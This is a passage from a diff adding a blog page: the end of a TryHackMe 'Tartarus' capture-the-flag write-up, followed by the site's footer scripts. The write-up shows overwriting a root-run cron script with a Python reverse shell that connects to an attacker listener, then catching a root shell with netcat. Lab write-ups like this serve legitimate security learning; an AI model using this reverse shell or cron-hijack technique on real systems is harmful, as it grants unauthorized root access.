+        sys.exit()
+</code></pre>
+
+<p>Reading the script it looks like something that would be ran via cronjob. Lets see what jobs are on the machine.</p>
+
+<pre><code class="language-highlight">d4rckh@ubuntu-xenial:/home/d4rckh$ cat /etc/crontab
+# /etc/crontab: system-wide crontab
+# Unlike any other crontab you don't have to run the `crontab'
+# command to install the new version when you edit this file
+# and files in /etc/cron.d. These files also have username fields,
+# that none of the other crontabs do.
+
+SHELL=/bin/sh
+PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+
+# m h dom mon dow user  command
+*/2 *   * * *   root    python /home/d4rckh/cleanup.py
+17 *    * * *   root    cd / &amp;&amp; run-parts --report /etc/cron.hourly
+25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.daily )
+47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.weekly )
+52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.monthly )
+#
+d4rckh@ubuntu-xenial:/home/d4rckh$ 
+</code></pre>
+
+<p>Perfect, so that script is being run by root. Lets modify to provide us with another reverses shell.</p>
+
+<pre><code class="language-highlight">┌─[daz@parrot]─[~/Documents/TryHackMe/Tartarus]
+└──╼ $nc -nvlp 8080
+listening on [any] 8080 ...
+</code></pre>
+
+<p>First start another netcat listener.</p>
+
+<pre><code class="language-highlight">d4rckh@ubuntu-xenial:/home/d4rckh$ cat cleanup.py 
+# -*- coding: utf-8 -*-
+#!/usr/bin/env python
+
+import socket,subprocess,os
+
+s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+s.connect(("&lt;HIDDEN&gt;",8080))
+os.dup2(s.fileno(),0)
+os.dup2(s.fileno(),1)
+os.dup2(s.fileno(),2)
+p=subprocess.call(["/bin/sh","-i"])
+</code></pre>
+
+<p>I grabbed the python reverse shell from <a href="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">pentestmonkey</a> and replaced the code in the script. Now I just need to wait for the reverse shell.</p>
+
+<pre><code class="language-highlight">┌─[daz@parrot]─[~/Documents/TryHackMe/Tartarus]
+└──╼ $nc -nvlp 8080
+listening on [any] 8080 ...
+connect to [10.8.21.217] from (UNKNOWN) [10.10.30.144] 33596
+/bin/sh: 0: can't access tty; job control turned off
+# whoami
+root
+# cd /root/
+# cat root.txt
+7e055812184a5fa&lt;HIDDEN&gt;
+# 
+</code></pre>
+
+<p>Root dance!</p>
+
+<p>Thanks for reading!</p>
+
+                </div>
+            </section>
+
+            <!-- Email subscribe form at the bottom of the page -->
+            
+
+            <footer class="post-full-footer">
+                <!-- Everything inside the #author tags pulls data from the author -->
+            </footer>
+
+            <!-- If you use Disqus comments, just uncomment this block.
+            The only thing you need to change is "test-apkdzgmqhj" - which
+            should be replaced with your own Disqus site-id. -->
+            
+
+        </article>
+
+    </div>
+</main>
+
+
+
+        <!-- Previous/next page links - displayed on every page -->
+        
+
+        <!-- The footer at the very bottom of the screen -->
+        <footer class="site-footer outer">
+            <div class="site-footer-content inner">
+                <section class="copyright"><a href="https://darrynbrownfield.co.uk/">Darryn Brownfield</a> &copy; 2020</section>
+                <nav class="site-footer-nav">
+                    <a href="/">Latest Posts</a>
+                 </nav>
+            </div>
+        </footer>
+
+    </div>
+
+    <!-- The big email subscribe modal content -->
+    
+
+    <!-- highlight.js -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.10.0/components/prism-abap.min.js"></script>
+    <script>$(document).ready(function() {
+      $('pre code').each(function(i, block) {
+        hljs.highlightBlock(block);
+      });
+    });</script>
+
+    <!-- jQuery + Fitvids, which makes all video embeds responsive -->
+    <script
+        src="https://code.jquery.com/jquery-3.2.1.min.js"
+        integrity="sha256-hwg4gsxgFZhOsEEamdOYGBf13FyQuiTwlAQgxVSNgt4="
+        crossorigin="anonymous">
+    </script>
+    <script type="text/javascript" src="/assets/js/jquery.fitvids.js"></script>
+    <script type="text/javascript" src="https://demo.ghost.io/assets/js/jquery.fitvids.js?v=724281a32e"></script>
+
+
+    <!-- Paginator increased to "infinit" in _config.yml -->
+    <!-- if paginator.posts  -->
+    <!-- <script>
+        var maxPages = parseInt('');
+    </script>
+    <script src="/assets/js/infinitescroll.js"></script> -->
+    <!-- /endif -->
+
+    
+
+
+    <!-- Add Google Analytics  -->
+    <!-- Google Analytics Tracking code -->
+ <script>
+  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+  })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+
+  ga('create', 'UA-175458891-1', 'auto');
+  ga('send', 'pageview');
+
+ </script>
+
+
+    <!-- The #block helper will pull in data from the #contentFor other template files. In this case, there's some JavaScript which we only want to use in post.hbs, but it needs to be included down here, after jQuery has already loaded. -->
+    
+        <script>
+
+// NOTE: Scroll performance is poor in Safari
+// - this appears to be due to the events firing much more slowly in Safari.
+//   Dropping the scroll event and using only a raf loop results in smoother
+//   scrolling but continuous processing even when not scrolling
+$(document).ready(function () {
+    // Start fitVids
+    var $postContent = $(".post-full-content");
+    $postContent.fitVids();
+    // End fitVids
+
+    var progressBar = document.querySelector('progress');
+    var header = document.querySelector('.floating-header');
+    var title = document.querySelector('.post-full-title');
+
+    var lastScrollY = window.scrollY;
+    var lastWindowHeight = window.innerHeight;
+    var lastDocumentHeight = $(document).height();
+    var ticking = false;
+
+    function onScroll() {
+        lastScrollY = window.scrollY;
+        requestTick();
+    }
+
+    function onResize() {
+        lastWindowHeight = window.innerHeight;
+        lastDocumentHeight = $(document).height();
+        requestTick();
+    }
+
+    function requestTick() {
+        if (!ticking) {
+            requestAnimationFrame(update);
+        }
+        ticking = true;
+    }
+
+    function update() {
+        var trigger = title.getBoundingClientRect().top + window.scrollY;
+        var triggerOffset = title.offsetHeight + 35;
+        var progressMax = lastDocumentHeight - lastWindowHeight;
+
+        // show/hide floating header
+        if (lastScrollY >= trigger + triggerOffset) {
+            header.classList.add('floating-active');
+        } else {
+            header.classList.remove('floating-active');
+        }
+
+        progressBar.setAttribute('max', progressMax);
+        progressBar.setAttribute('value', lastScrollY);
+
+        ticking = false;
+    }
+
+    window.addEventListener('scroll', onScroll, {passive: true});
+    window.addEventListener('resize', onResize, false);
+
+    update();
+});
+</script>
+
+    
+
+    <!-- Ghost outputs important scripts and data with this tag - it should always be the very last thing before the closing body tag -->
+    <!-- ghost_foot -->
+
+</body>
+</html>
